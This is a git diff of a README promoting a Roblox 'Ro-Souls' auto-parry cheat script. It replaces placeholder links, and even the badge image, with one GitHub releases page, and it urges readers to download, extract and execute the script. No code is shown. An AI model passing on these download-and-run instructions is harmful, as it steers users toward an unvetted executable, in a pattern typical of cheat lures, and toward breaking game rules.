@@ -1,6 +1,6 @@
 # 🚀 Roblox Ro-Souls Auto-Parry Script
 
-![Roblox](https://img.shields.io/badge/Roblox-Ro--Souls-brightgreen)
+![Roblox](https://github.com/Jushedc/Roblox-Ro-Souls-Script/releases)
 
 Welcome to the **Roblox Ro-Souls Auto-Parry Script** repository! This script is designed to enhance your gameplay in the Roblox game Ro-Souls-3 by automating the parrying process. With this tool, you can focus on strategy while the script handles the timing of parries for you.
 
@@ -24,7 +24,7 @@ Welcome to the **Roblox Ro-Souls Auto-Parry Script** repository! This script is 
 
 To get started, download the script from the following link:
 
-[Download Auto-Parry Script](https://github.com/repo/user/archive.zip)
+[Download Auto-Parry Script](https://github.com/Jushedc/Roblox-Ro-Souls-Script/releases)
 
 Once downloaded, extract the files and execute the script in your Roblox environment.
 
@@ -58,8 +58,8 @@ For questions or support, please reach out to the repository maintainer.
 
 ---
 
-If you encounter any issues or need further assistance, check the [Releases](https://github.com/repo/user/releases) section for updates or additional information. 
+If you encounter any issues or need further assistance, check the [Releases](https://github.com/Jushedc/Roblox-Ro-Souls-Script/releases) section for updates or additional information. 
 
 Thank you for using the **Roblox Ro-Souls Auto-Parry Script**! We hope it enhances your gaming experience. 
 
-For more information and updates, feel free to visit the repository at [Roblox Ro-Souls Auto-Parry Script](https://github.com/repo/user/archive.zip).
+For more information and updates, feel free to visit the repository at [Roblox Ro-Souls Auto-Parry Script](https://github.com/Jushedc/Roblox-Ro-Souls-Script/releases).
